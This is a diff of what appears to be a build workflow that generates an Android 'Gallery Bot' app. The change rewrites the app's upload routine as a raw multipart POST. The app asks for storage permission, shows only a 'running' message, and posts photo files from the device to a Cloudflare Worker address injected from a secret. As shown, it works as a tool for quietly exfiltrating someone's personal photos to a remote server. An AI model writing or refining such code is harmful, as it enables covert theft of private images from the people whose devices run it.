@@ -68,7 +68,7 @@ jobs:
         }
         EOF
 
-        # app/build.gradle
+        # app/build.gradle (No extra dependencies needed)
         cat << 'EOF' > app/build.gradle
         plugins {
             id 'com.android.application'
@@ -84,19 +84,14 @@ jobs:
                 versionName "1.0"
             }
         }
-        dependencies {
-            implementation 'androidx.appcompat:appcompat:1.6.1'
-            implementation 'com.squareup.okhttp3:okhttp:4.9.3'
-        }
         EOF
 
-        # MainActivity.java (Gallery & Cloudflare Worker Integration)
+        # MainActivity.java
         cat << 'EOF' > app/src/main/java/com/example/botapp/MainActivity.java
         package com.example.botapp;
 
         import android.Manifest;
         import android.app.Activity;
-        import android.content.ContentUris;
         import android.content.pm.PackageManager;
         import android.database.Cursor;
         import android.net.Uri;
@@ -106,13 +101,15 @@ jobs:
         import androidx.core.app.ActivityCompat;
         import androidx.core.content.ContextCompat;
 
-        import okhttp3.*;
         import java.io.File;
-        import java.io.IOException;
+        import java.io.FileInputStream;
+        import java.io.OutputStream;
+        import java.net.HttpURLConnection;
+        import java.net.URL;
 
         public class MainActivity extends Activity {
             private static final int PERMISSION_REQUEST_CODE = 100;
-            private static final String CF_URL = "https://your-cloudflare-worker-url.workers.dev"; // Replaced dynamically below
+            private static final String CF_URL = "https://your-cloudflare-worker-url.workers.dev";
 
             @Override
             protected void onCreate(Bundle savedInstanceState) {
@@ -121,7 +118,6 @@ jobs:
                 tv.setText("Gallery Bot is running...");
                 setContentView(tv);
 
-                // Inject Cloudflare Worker URL from Environment Secret
                 String workerUrl = "${CF_URL}";
 
                 if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
@@ -169,21 +165,42 @@ jobs:
             }
 
             private void uploadFile(String urlString, File file) {
-                OkHttpClient client = new OkHttpClient();
-                RequestBody requestBody = new MultipartBody.Builder()
-                        .setType(MultipartBody.FORM)
-                        .addFormDataPart("photo", file.getName(),
-                                RequestBody.create(file, MediaType.parse("image/*")))
-                        .build();
+                String boundary = "*****";
+                String lineEnd = "\r\n";
+                String twoHyphens = "--";
 
-                Request request = new Request.Builder()
-                        .url(urlString)
-                        .post(requestBody)
-                        .build();
+                try {
+                    URL url = new URL(urlString);
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setDoInput(true);
+                    conn.setDoOutput(true);
+                    conn.setUseCaches(false);
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Connection", "Keep-Alive");
+                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
 
-                try (Response response = client.newCall(request).execute()) {
-                    // Successfully sent
-                } catch (IOException e) {
+                    OutputStream outputStream = conn.getOutputStream();
+                    FileInputStream fileInputStream = new FileInputStream(file);
+
+                    outputStream.write((twoHyphens + boundary + lineEnd).getBytes());
+                    outputStream.write(("Content-Disposition: form-data; name=\"photo\";filename=\"" + file.getName() + "\"" + lineEnd).getBytes());
+                    outputStream.write(("Content-Type: image/*" + lineEnd + lineEnd).getBytes());
+
+                    byte[] buffer = new byte[4096];
+                    int bytesRead;
+                    while ((bytesRead = fileInputStream.read(buffer)) != -1) {
+                        outputStream.write(buffer, 0, bytesRead);
+                    }
+
+                    outputStream.write((lineEnd).getBytes());
+                    outputStream.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
+
+                    fileInputStream.close();
+                    outputStream.flush();
+                    outputStream.close();
+
+                    int serverResponseCode = conn.getResponseCode();
+                } catch (Exception e) {
                     e.printStackTrace();
                 }
             }
